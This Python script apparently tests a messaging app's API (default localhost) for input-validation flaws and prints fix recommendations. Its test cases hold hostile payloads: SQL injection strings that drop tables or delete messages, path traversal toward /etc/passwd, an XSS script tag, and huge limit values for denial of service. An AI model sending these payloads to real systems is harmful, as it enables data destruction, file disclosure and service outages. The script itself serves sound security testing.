#!/usr/bin/env python3
"""
SecureDove Query Parameter Attack Script
Tests query parameter injection and manipulation vulnerabilities.

VULNERABILITIES EXPLOITED:
1. No bounds checking on limit parameter (can request billions of messages)
2. No bounds checking on offset parameter (integer overflow potential)
3. Negative limit/offset values not validated
4. Type confusion with non-integer values
5. DoS through extremely large limit values

Attack Vector:
GET /api/messages/:conversationId?limit=X&offset=Y with malicious parameters
"""

import requests
import sys
import time
import json
from typing import Dict, List, Tuple

class QueryParameterAttacker:
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url.rstrip('/')
        self.api_url = f"{self.base_url}/api"
        self.session = requests.Session()
        self.token = None
        self.username = None
        self.test_conversation_id = None
        
    def register_and_login(self, username: str, password: str) -> bool:
        """Register and login user"""
        try:
            payload = {
                "username": username,
                "password": password,
                "public_key": "test_pk",
                "salt": "test_salt",
                "encrypted_private_key": "test_epk"
            }
            
            reg_response = self.session.post(f"{self.api_url}/auth/register", json=payload, timeout=5)
            print(f"Registration response: {reg_response.status_code} - {reg_response.text}")
            
            response = self.session.post(
                f"{self.api_url}/auth/login",
                json={"username": username, "password": password},
                timeout=5
            )
            print(f"Login response: {response.status_code} - {response.text}")
            
            if response.status_code == 200:
                self.token = response.json().get('token')
                self.username = username
                print(f"[+] Authenticated as: {username}")
                return True
            
            return False
        except Exception as e:
            print(f"[-] Authentication error: {e}")
            return False
    
    def setup_test_data(self) -> bool:
        """Create test conversation with some messages"""
        try:
            self.test_conversation_id = f"test_query_{int(time.time())}"
            
            # Create conversation
            payload = {
                "conversation_entries": [{
                    "id": self.test_conversation_id,
                    "username": self.username,
                    "encrypted_content_key": "test_key",
                    "content_key_number": 1
                }]
            }
            
            response = self.session.post(
                f"{self.api_url}/conversations",
                json=payload,
                headers={"Authorization": f"Bearer {self.token}", "Content-Type": "application/json"},
                timeout=5
            )
            
            if response.status_code not in [200, 201]:
                return False
            
            # Add a few test messages
            for i in range(5):
                msg_payload = {
                    "conversation_id": self.test_conversation_id,
                    "content_key_number": 1,
                    "encrypted_msg_content": f"Test message {i}"
                }
                self.session.post(
                    f"{self.api_url}/messages",
                    json=msg_payload,
                    headers={"Authorization": f"Bearer {self.token}", "Content-Type": "application/json"},
                    timeout=5
                )
                time.sleep(0.1)
            
            print(f"[+] Created test conversation with messages")
            return True
            
        except Exception as e:
            print(f"[-] Setup error: {e}")
            return False
    
    def test_limit_parameter(self) -> List[Dict]:
        """Test limit parameter validation"""
        print("\n" + "="*70)
        print("TESTING LIMIT PARAMETER VALIDATION")
        print("="*70)
        
        test_cases = [
            ("Negative limit", -1),
            ("Zero limit", 0),
            ("Extremely large limit", 999999999),
            ("Integer overflow (2^31)", 2147483647),
            ("Integer overflow (2^32)", 4294967295),
            ("Larger than int64", 9223372036854775807),
            ("Float value", 10.5),
            ("String value", "not_a_number"),
            ("SQL injection", "50; DROP TABLE messages"),
            ("Boolean true", "true"),
            ("Null string", "null"),
            ("Negative scientific", "-1e10"),
            ("Huge scientific", "1e100"),
        ]
        
        results = []
        for description, limit_val in test_cases:
            print(f"\n[*] Testing: {description}")
            print(f"[*] Limit: {limit_val}")
            
            try:
                start_time = time.time()
                response = self.session.get(
                    f"{self.api_url}/messages/{self.test_conversation_id}",
                    params={"limit": limit_val},
                    headers={"Authorization": f"Bearer {self.token}"},
                    timeout=30
                )
                duration = time.time() - start_time
                
                if response.status_code == 200:
                    data = response.json()
                    messages_returned = len(data.get('messages', []))
                    print(f"[!] ACCEPTED: Returned {messages_returned} messages in {duration:.2f}s")
                    
                    # Check if dangerous values were accepted
                    if isinstance(limit_val, (int, float)) and (limit_val < 0 or limit_val > 10000):
                        vulnerable = True
                        print(f"[!] VULNERABILITY: Dangerous limit value accepted!")
                    else:
                        vulnerable = False
                else:
                    print(f"[-] Rejected (Status: {response.status_code})")
                    vulnerable = False
                
                results.append({
                    "test": description,
                    "limit_value": str(limit_val),
                    "vulnerable": vulnerable,
                    "status_code": response.status_code,
                    "duration": f"{duration:.2f}s"
                })
                
            except requests.exceptions.Timeout:
                print(f"[!] TIMEOUT: Query took too long (DoS indicator)")
                results.append({
                    "test": description,
                    "limit_value": str(limit_val),
                    "vulnerable": True,
                    "error": "Timeout - DoS potential"
                })
            except Exception as e:
                print(f"[-] Error: {e}")
                results.append({
                    "test": description,
                    "limit_value": str(limit_val),
                    "vulnerable": False,
                    "error": str(e)
                })
            
            time.sleep(0.3)
        
        return results
    
    def test_offset_parameter(self) -> List[Dict]:
        """Test offset parameter validation"""
        print("\n" + "="*70)
        print("TESTING OFFSET PARAMETER VALIDATION")
        print("="*70)
        
        test_cases = [
            ("Negative offset", -1),
            ("Zero offset", 0),
            ("Large offset", 999999),
            ("Integer overflow (2^31)", 2147483647),
            ("Larger than dataset", 1000000),
            ("Float value", 5.5),
            ("String value", "not_a_number"),
            ("SQL injection", "0; DELETE FROM messages"),
            ("Boolean false", "false"),
        ]
        
        results = []
        for description, offset_val in test_cases:
            print(f"\n[*] Testing: {description}")
            print(f"[*] Offset: {offset_val}")
            
            try:
                start_time = time.time()
                response = self.session.get(
                    f"{self.api_url}/messages/{self.test_conversation_id}",
                    params={"offset": offset_val, "limit": 10},
                    headers={"Authorization": f"Bearer {self.token}"},
                    timeout=30
                )
                duration = time.time() - start_time
                
                if response.status_code == 200:
                    print(f"[!] ACCEPTED in {duration:.2f}s")
                    
                    # Negative offsets should never be accepted
                    if isinstance(offset_val, (int, float)) and offset_val < 0:
                        vulnerable = True
                        print(f"[!] VULNERABILITY: Negative offset accepted!")
                    else:
                        vulnerable = False
                else:
                    print(f"[-] Rejected (Status: {response.status_code})")
                    vulnerable = False
                
                results.append({
                    "test": description,
                    "offset_value": str(offset_val),
                    "vulnerable": vulnerable,
                    "status_code": response.status_code,
                    "duration": f"{duration:.2f}s"
                })
                
            except requests.exceptions.Timeout:
                print(f"[!] TIMEOUT: Query took too long")
                results.append({
                    "test": description,
                    "offset_value": str(offset_val),
                    "vulnerable": True,
                    "error": "Timeout"
                })
            except Exception as e:
                print(f"[-] Error: {e}")
                results.append({
                    "test": description,
                    "offset_value": str(offset_val),
                    "vulnerable": False,
                    "error": str(e)
                })
            
            time.sleep(0.3)
        
        return results
    
    def test_combined_parameters(self) -> List[Dict]:
        """Test combinations of limit and offset"""
        print("\n" + "="*70)
        print("TESTING COMBINED PARAMETER ATTACKS")
        print("="*70)
        
        test_cases = [
            ("Both negative", {"limit": -10, "offset": -5}),
            ("Both huge", {"limit": 1000000, "offset": 1000000}),
            ("Mismatched types", {"limit": "string", "offset": 123}),
            ("SQL injection combo", {"limit": "50; DROP TABLE", "offset": "0; DELETE FROM"}),
            ("Integer overflow both", {"limit": 2147483647, "offset": 2147483647}),
            ("Limit huge, offset negative", {"limit": 999999, "offset": -1}),
        ]
        
        results = []
        for description, params in test_cases:
            print(f"\n[*] Testing: {description}")
            print(f"[*] Params: {params}")
            
            try:
                start_time = time.time()
                response = self.session.get(
                    f"{self.api_url}/messages/{self.test_conversation_id}",
                    params=params,
                    headers={"Authorization": f"Bearer {self.token}"},
                    timeout=30
                )
                duration = time.time() - start_time
                
                if response.status_code == 200:
                    print(f"[!] VULNERABILITY: Accepted malicious parameter combination!")
                    print(f"    Processing time: {duration:.2f}s")
                    vulnerable = True
                else:
                    print(f"[-] Rejected (Status: {response.status_code})")
                    vulnerable = False
                
                results.append({
                    "test": description,
                    "params": str(params),
                    "vulnerable": vulnerable,
                    "status_code": response.status_code,
                    "duration": f"{duration:.2f}s"
                })
                
            except requests.exceptions.Timeout:
                print(f"[!] TIMEOUT: DoS potential")
                results.append({
                    "test": description,
                    "params": str(params),
                    "vulnerable": True,
                    "error": "Timeout - DoS"
                })
            except Exception as e:
                print(f"[-] Error: {e}")
                results.append({
                    "test": description,
                    "params": str(params),
                    "vulnerable": False,
                    "error": str(e)
                })
            
            time.sleep(0.3)
        
        return results
    
    def test_conversation_id_in_url(self) -> List[Dict]:
        """Test conversation ID parameter injection in URL path"""
        print("\n" + "="*70)
        print("TESTING CONVERSATION ID URL INJECTION")
        print("="*70)
        
        test_cases = [
            ("SQL injection", "1'; DROP TABLE messages; --"),
            ("Path traversal", "../../../etc/passwd"),
            ("Null bytes", "conv\x00id"),
            ("URL encoding bypass", "%2e%2e%2f%2e%2e%2f"),
            ("Double encoding", "%252e%252e%252f"),
            ("Unicode", "会話🔒"),
            ("Script tag", "<script>alert('xss')</script>"),
        ]
        
        results = []
        for description, conv_id in test_cases:
            print(f"\n[*] Testing: {description}")
            print(f"[*] Conversation ID: '{conv_id}'")
            
            try:
                response = self.session.get(
                    f"{self.api_url}/messages/{conv_id}",
                    params={"limit": 10},
                    headers={"Authorization": f"Bearer {self.token}"},
                    timeout=10
                )
                
                # Should return 403 (not in conversation) or 404 (not found)
                # If it returns 500, there's an error handling issue
                if response.status_code == 500:
                    print(f"[!] VULNERABILITY: Server error on malicious ID!")
                    vulnerable = True
                elif response.status_code == 200:
                    print(f"[!] VULNERABILITY: Somehow succeeded with malicious ID!")
                    vulnerable = True
                else:
                    print(f"[-] Handled gracefully (Status: {response.status_code})")
                    vulnerable = False
                
                results.append({
                    "test": description,
                    "conversation_id": conv_id,
                    "vulnerable": vulnerable,
                    "status_code": response.status_code
                })
                
            except Exception as e:
                print(f"[-] Error: {e}")
                results.append({
                    "test": description,
                    "conversation_id": conv_id,
                    "vulnerable": False,
                    "error": str(e)
                })
            
            time.sleep(0.3)
        
        return results
    
    def generate_report(self, limit_results: List[Dict], offset_results: List[Dict],
                       combined_results: List[Dict], url_results: List[Dict]):
        """Generate vulnerability report"""
        print("\n" + "="*70)
        print("QUERY PARAMETER VULNERABILITY REPORT")
        print("="*70)
        
        # Limit vulnerabilities
        limit_vulns = [r for r in limit_results if r.get('vulnerable')]
        print(f"\n[*] Limit Parameter:")
        print(f"    Tests: {len(limit_results)}")
        print(f"    Vulnerabilities: {len(limit_vulns)}")
        
        if limit_vulns:
            print(f"\n[!] VULNERABLE LIMIT VALUES:")
            for v in limit_vulns:
                print(f"    - {v['test']}: {v['limit_value']}")
        
        # Offset vulnerabilities
        offset_vulns = [r for r in offset_results if r.get('vulnerable')]
        print(f"\n[*] Offset Parameter:")
        print(f"    Tests: {len(offset_results)}")
        print(f"    Vulnerabilities: {len(offset_vulns)}")
        
        if offset_vulns:
            print(f"\n[!] VULNERABLE OFFSET VALUES:")
            for v in offset_vulns:
                print(f"    - {v['test']}: {v['offset_value']}")
        
        # Combined vulnerabilities
        combined_vulns = [r for r in combined_results if r.get('vulnerable')]
        print(f"\n[*] Combined Parameters:")
        print(f"    Tests: {len(combined_results)}")
        print(f"    Vulnerabilities: {len(combined_vulns)}")
        
        if combined_vulns:
            print(f"\n[!] VULNERABLE COMBINATIONS:")
            for v in combined_vulns:
                print(f"    - {v['test']}")
        
        # URL injection vulnerabilities
        url_vulns = [r for r in url_results if r.get('vulnerable')]
        print(f"\n[*] URL Path Injection:")
        print(f"    Tests: {len(url_results)}")
        print(f"    Vulnerabilities: {len(url_vulns)}")
        
        if url_vulns:
            print(f"\n[!] VULNERABLE URL HANDLING:")
            for v in url_vulns:
                print(f"    - {v['test']}")
        
        # Total
        total_vulns = len(limit_vulns) + len(offset_vulns) + len(combined_vulns) + len(url_vulns)
        
        print(f"\n{'='*70}")
        print(f"TOTAL VULNERABILITIES: {total_vulns}")
        print(f"{'='*70}")
        
        # Recommendations
        print("\n[*] RECOMMENDATIONS:")
        print("    1. Add strict bounds checking for limit parameter:")
        print("       - Minimum: 1")
        print("       - Maximum: 100 or 1000")
        print("       - Must be positive integer")
        print("    2. Add strict bounds checking for offset parameter:")
        print("       - Minimum: 0")
        print("       - Maximum: reasonable value (e.g., 1,000,000)")
        print("       - Must be non-negative integer")
        print("    3. Validate parameter types before parseInt:")
        print("       - Reject non-numeric strings")
        print("       - Handle NaN and Infinity")
        print("    4. Add error handling for URL path injection:")
        print("       - Sanitize conversation IDs in URL")
        print("       - Return 400 for malformed IDs, not 500")
        print("    5. Consider pagination limits:")
        print("       - Max items per page: 100")
        print("       - Max offset: 10,000 (force filtering instead)")
        
        # Save report
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        report_file = f"query_parameter_report_{timestamp}.json"
        
        report_data = {
            "timestamp": timestamp,
            "target": self.api_url,
            "limit_tests": limit_results,
            "offset_tests": offset_results,
            "combined_tests": combined_results,
            "url_injection_tests": url_results,
            "summary": {
                "total_tests": len(limit_results) + len(offset_results) + len(combined_results) + len(url_results),
                "total_vulnerabilities": total_vulns
            }
        }
        
        try:
            with open(report_file, 'w') as f:
                json.dump(report_data, f, indent=2)
            print(f"\n[+] Report saved to: {report_file}")
        except Exception as e:
            print(f"\n[-] Could not save report: {e}")

def main():
    base_url = "http://localhost:8000"
    username = f"qry{int(time.time()) % 100000}"
    password = "TestPass123!"
    
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    
    print("="*70)
    print("SecureDove Query Parameter Attack Script")
    print("="*70)
    print(f"Target: {base_url}")
    print(f"Test user: {username}")
    print("="*70)
    
    attacker = QueryParameterAttacker(base_url)
    
    # Setup
    print("\n[*] Setting up test environment...")
    if not attacker.register_and_login(username, password):
        print("[-] Authentication failed!")
        sys.exit(1)
    
    if not attacker.setup_test_data():
        print("[-] Could not setup test data!")
        sys.exit(1)
    
    # Run tests
    time.sleep(1)
    print("\n[*] Starting vulnerability tests...")
    
    limit_results = attacker.test_limit_parameter()
    time.sleep(1)
    
    offset_results = attacker.test_offset_parameter()
    time.sleep(1)
    
    combined_results = attacker.test_combined_parameters()
    time.sleep(1)
    
    url_results = attacker.test_conversation_id_in_url()
    
    # Report
    attacker.generate_report(limit_results, offset_results, combined_results, url_results)
    
    print("\n[*] Testing complete!")

if __name__ == "__main__":
    main()
